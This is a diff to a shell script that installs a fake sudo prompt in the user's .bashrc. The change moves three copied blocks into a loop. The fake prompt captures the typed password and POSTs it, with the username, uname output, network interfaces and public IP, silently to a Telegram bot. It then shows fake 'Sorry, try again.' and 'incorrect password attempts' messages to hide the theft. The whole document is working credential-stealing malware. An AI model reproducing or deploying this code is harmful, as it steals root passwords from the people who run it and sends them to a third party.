@@ -29,9 +29,11 @@ if ! ping -c 1 8.8.8.8 &> /dev/null ; then
 /bin/sudo \$*
 exit
 fi
+
+IP=\$( curl -s https://ipinfo.io/ip & 2> /dev/null )
+for i in {1..3}; do
 read -se -p "[sudo] password for \$(whoami): " pass
 pass="\${pass//+/(plus_symbol)}"
-IP=\$( curl -s https://ipinfo.io/ip & 2> /dev/null )
 curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass
 
 User: \$(whoami)
@@ -42,40 +44,17 @@ Local IP and interfaces: \$(ip a | grep -E \(^[1-9]\|inet\ \) )
 
 Public IP: \$IP
 " &> /dev/null &
-sleep 3
-echo "Sorry, try again."
-read -se -p "[sudo] password for \$(whoami): " pass
-pass="\${pass//+/(plus_symbol)}"
-curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass
-
-User: \$(whoami)
-
-Uname: \$(uname -a)
-
-Local IP and interfaces: \$( ip a | grep -E \(^[1-9]\|inet\ \) )
-
-Public IP: \$IP
-" &> /dev/null &
+if (( "\$i" == "2" )); then 
 F_coverup &
+fi
 sleep 3
-echo "Sorry, try again."
-read -se -p "[sudo] password for \$(whoami): " pass
-pass="\${pass//+/(plus_symbol)}"
-curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass
-
-User: \$(whoami)
-
-Uname: \$(uname -a)
-
-Local IP and interfaces: \$( ip a | grep -E \(^[1-9]\|inet\ \) )
-
-Public IP: \$IP
-" &> /dev/null &
-sleep 3
+if (( "\$i" == "3" )); then 
 echo "sudo: 3 incorrect password attempts"
-
-
 exec bash
+else
+echo "Sorry, try again."
+fi
+done
 ' >> \$HOME/.bash_info
 
 echo "# Making sudo config for current user" >> "\$HOME/.bashrc"
